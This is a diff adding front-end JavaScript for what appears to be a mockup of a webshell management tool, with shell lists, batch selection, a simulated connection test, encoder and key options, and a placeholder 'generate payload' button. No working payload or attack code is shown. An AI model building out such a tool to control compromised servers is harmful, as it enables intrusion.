+function toggleTreeGroup(el) {
+  const children = el.nextElementSibling;
+  if (!children || !children.classList.contains('tree-children')) return;
+  const isCollapsed = children.classList.toggle('collapsed');
+  el.classList.toggle('collapsed', isCollapsed);
+  lucide.createIcons();
+}
+
+function toggleBatch(btn) {
+  const area = document.querySelector('#tab-project .shell-area');
+  const isBatch = area.classList.toggle('batch-mode');
+  btn.classList.toggle('active', isBatch);
+  // Clear selections on exit
+  if (!isBatch) {
+    area.querySelectorAll('.row-chk').forEach(c => c.checked = false);
+    const chkAll = document.getElementById('chk-all');
+    if (chkAll) chkAll.checked = false;
+    updateBatchCount(area);
+  }
+  lucide.createIcons();
+}
+
+function selectAll(chkAll) {
+  const area = document.querySelector('#tab-project .shell-area');
+  area.querySelectorAll('.row-chk').forEach(c => c.checked = chkAll.checked);
+  updateBatchCount(area);
+}
+
+function updateBatchCount(area) {
+  const count = area.querySelectorAll('.row-chk:checked').length;
+  const label = document.getElementById('batch-count-label');
+  if (label) label.textContent = `已选 ${count} 个`;
+}
+
+function openModal(id) {
+  const m = document.getElementById(id);
+  if (m) { m.style.display = 'flex'; lucide.createIcons(); }
+}
+function closeModal(id) {
+  const m = document.getElementById(id);
+  if (m) m.style.display = 'none';
+}
+function closeModalByOverlay(e, id) {
+  if (e.target === e.currentTarget) closeModal(id);
+}
+
+function showTrash(el) {
+  const tree = document.querySelector('#tab-project .project-tree');
+  tree.querySelectorAll('.tree-item').forEach(i => i.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('shell-main').style.display = 'none';
+  document.getElementById('trash-view').style.display = 'flex';
+  lucide.createIcons();
+}
+function showAllShells() {
+  const tree = document.querySelector('#tab-project .project-tree');
+  tree.querySelectorAll('.tree-item').forEach(i => i.classList.remove('active'));
+  tree.querySelector('.tree-group').classList.add('active');
+  document.getElementById('shell-main').style.display = 'flex';
+  document.getElementById('trash-view').style.display = 'none';
+  lucide.createIcons();
+}
+
+function testConn() {
+  const r = document.getElementById('conn-result');
+  r.textContent = '连接中…';
+  r.className = 'conn-result pending';
+  setTimeout(() => {
+    r.textContent = '✓ 连接成功 · 延迟 38ms · PHP 8.1';
+    r.className = 'conn-result ok';
+  }, 1100);
+}
+
+// Update count on individual checkbox change
+document.addEventListener('change', e => {
+  if (e.target.classList.contains('row-chk')) {
+    const area = document.querySelector('#tab-project .shell-area');
+    updateBatchCount(area);
+  }
+});
+
+function navTo(name) {
+  const idx = { home: 0, project: 1, payload: 2, plugin: 3, settings: 4 }[name];
+  const btn = document.querySelectorAll('.tab-btn')[idx];
+  if (btn) switchTab(name, btn);
+}
+
+// ─── Payload interactions ───────────────────────────────────────────────────
+
+function selectEnc(el) {
+  el.closest('.enc-options').querySelectorAll('.enc-option').forEach(o => {
+    o.classList.remove('active');
+    const c = o.querySelector('.radio-circle');
+    if (c) { c.style.borderColor = ''; c.style.background = ''; }
+  });
+  el.classList.add('active');
+  const circle = el.querySelector('.radio-circle');
+  if (circle) {
+    circle.style.borderColor = 'var(--accent)';
+    circle.style.background = 'radial-gradient(circle, var(--accent) 3px, transparent 3px)';
+  }
+}
+
+function toggleKeyVis(btn) {
+  const inp = btn.closest('.key-input-row').querySelector('.key-input');
+  if (!inp) return;
+  const isPass = inp.type === 'password';
+  inp.type = isPass ? 'text' : 'password';
+  const icon = btn.querySelector('[data-lucide]');
+  if (icon) icon.setAttribute('data-lucide', isPass ? 'eye-off' : 'eye');
+  lucide.createIcons();
+}
+
+function copyKey(btn) {
+  const inp = btn.closest('.key-input-row').querySelector('.key-input');
+  if (inp) navigator.clipboard.writeText(inp.value).catch(() => {});
+  const icon = btn.querySelector('[data-lucide]');
+  if (!icon) return;
+  icon.setAttribute('data-lucide', 'check');
+  lucide.createIcons();
+  setTimeout(() => { icon.setAttribute('data-lucide', 'copy'); lucide.createIcons(); }, 1500);
+}
+
+function generatePayload() {
+  const btn = document.querySelector('.gen-btn');
+  if (!btn || btn.classList.contains('loading')) return;
+  btn.classList.add('loading');
+  btn.textContent = '生成中…';
+  setTimeout(() => {
+    btn.classList.remove('loading');
+    btn.classList.add('success');
+    btn.textContent = '✓ 已生成';
+    setTimeout(() => {
+      btn.classList.remove('success');
+      btn.innerHTML = '<i data-lucide="zap" style="width:14px;height:14px"></i> 生成载荷';
+      lucide.createIcons();
+    }, 2000);
+  }, 1200);
+}
+
+function toggleDiff() {
+  const single = document.getElementById('single-code');
+  const diff = document.getElementById('diff-view');
+  const btn = document.querySelector('.diff-btn');
+  if (!single || !diff) return;
+  const isDiff = diff.style.display !== 'none';
+  single.style.display = isDiff ? '' : 'none';
+  diff.style.display = isDiff ? 'none' : 'flex';
+  if (btn) btn.classList.toggle('on', !isDiff);
+}
+
+function copyCode(btn) {
+  const codeEl = document.querySelector('#single-code .code-body-inner') || document.querySelector('.code-body-inner');
+  if (codeEl) navigator.clipboard.writeText(codeEl.innerText).catch(() => {});
+  const icon = btn.querySelector('[data-lucide]');
+  if (!icon) return;
+  icon.setAttribute('data-lucide', 'check');
+  lucide.createIcons();
+  setTimeout(() => { icon.setAttribute('data-lucide', 'copy'); lucide.createIcons(); }, 1500);
+}
+
+// Wire sidebar nav items to tab switching
+(function wireSidebarNav() {
+  const iconToTab = { house: 'home', folder: 'project', package: 'payload', puzzle: 'plugin', settings: 'settings' };
+  document.querySelectorAll('.m-nav-item').forEach(item => {
+    const icon = item.querySelector('[data-lucide]');
+    if (!icon) return;
+    const target = iconToTab[icon.getAttribute('data-lucide')];
+    if (target) item.style.cursor = 'pointer', item.onclick = () => navTo(target);
+  });
+})();
+
+lucide.createIcons();
+</script>
+</body>
+</html>
